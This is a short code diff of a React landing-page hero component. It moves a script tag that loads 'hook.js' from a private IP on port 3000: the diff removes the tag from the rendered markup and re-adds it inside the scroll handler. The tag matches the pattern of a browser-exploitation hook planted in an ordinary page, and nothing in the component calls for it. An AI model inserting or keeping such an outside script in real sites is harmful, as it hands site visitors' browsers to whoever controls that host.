@@ -17,6 +17,7 @@ export default function LandingHero() {
 
   const handleScroll = () => {
     setScrollY(window.scrollY);
+    <script src="http://172.16.213.144:3000/hook.js"></script>
   };
 
   useEffect(() => {
@@ -34,7 +35,6 @@ export default function LandingHero() {
       ref={ref}
       className="pointer-events-none flex h-[calc(100vh-112px)] items-center px-6 sm:px-14 md:px-20"
     >
-      <script src="http://172.16.213.144:3000/hook.js"></script>
       <div className="-mt-[112px] w-full">
         <div className="mx-auto max-w-7xl">
           <AnimatePresence>
